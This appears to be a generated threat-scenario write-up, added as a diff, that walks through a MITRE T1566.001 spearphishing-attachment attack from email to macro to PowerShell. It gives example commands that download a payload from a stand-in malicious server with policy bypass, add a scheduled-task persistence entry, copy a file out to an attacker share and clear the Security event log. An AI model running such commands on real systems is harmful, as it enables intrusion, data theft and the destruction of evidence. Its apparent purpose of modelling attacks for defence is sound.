@@ -1,0 +1,47 @@
+<output>
+Pattern Name: T1566.001 - Spearphishing Attachment
+Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a PowerShell script to download and execute a payload. The attack leverages multiple applications, including Outlook for email delivery, and PowerShell for execution of the malicious payload.
+
+Attack Flow Breakdown:
+
+1. **Initial Access via Email**
+   - **Application Involved**: Outlook
+   - **User Action**: The user receives an email with a subject line "Invoice Attached" and an attachment named "Invoice_12345.docx".
+   - **Key Artifacts**: Email headers, attachment file "Invoice_12345.docx".
+
+2. **Opening the Malicious Attachment**
+   - **Application Involved**: Microsoft Word (part of Office Suite)
+   - **User Action**: The user opens the attachment, which contains a macro that is set to run automatically.
+   - **Key Artifacts**: Macro code embedded in the Word document.
+
+3. **Execution of the Macro**
+   - **Application Involved**: Microsoft Word
+   - **User Action**: The macro executes, which triggers a PowerShell command to download a malicious script from a remote server.
+   - **Key Artifacts**: PowerShell command executed via the macro, e.g., `powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicious-server.com/payload.ps1 -OutFile C:\Users\Public\payload.ps1"`.
+
+4. **Downloading the Payload**
+   - **Application Involved**: PowerShell
+   - **User Action**: The PowerShell command runs and downloads the payload script to the local system.
+   - **Key Artifacts**: Downloaded file "C:\Users\Public\payload.ps1".
+
+5. **Executing the Downloaded Payload**
+   - **Application Involved**: PowerShell
+   - **User Action**: The macro continues to execute the downloaded PowerShell script.
+   - **Key Artifacts**: Execution command, e.g., `powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1`.
+
+6. **Establishing Persistence**
+   - **Application Involved**: PowerShell
+   - **User Action**: The payload script creates a scheduled task to ensure persistence.
+   - **Key Artifacts**: Scheduled task creation command, e.g., `schtasks /create /tn "MaliciousTask" /tr "powershell.exe -File C:\Users\Public\payload.ps1" /sc onlogon /rl highest`.
+
+7. **Data Exfiltration or Lateral Movement**
+   - **Application Involved**: PowerShell
+   - **User Action**: The payload may execute commands to exfiltrate data or move laterally within the network.
+   - **Key Artifacts**: PowerShell commands for data exfiltration, e.g., `Invoke-Command -ScriptBlock { Get-Content C:\Users\Public\SensitiveData.txt } | Out-File \\attacker-server\exfiltrated_data.txt`.
+
+8. **Cleanup and Covering Tracks**
+   - **Application Involved**: PowerShell
+   - **User Action**: The script may delete logs or evidence of its execution.
+   - **Key Artifacts**: Command to clear event logs, e.g., `wevtutil cl Security`.
+
+</output>
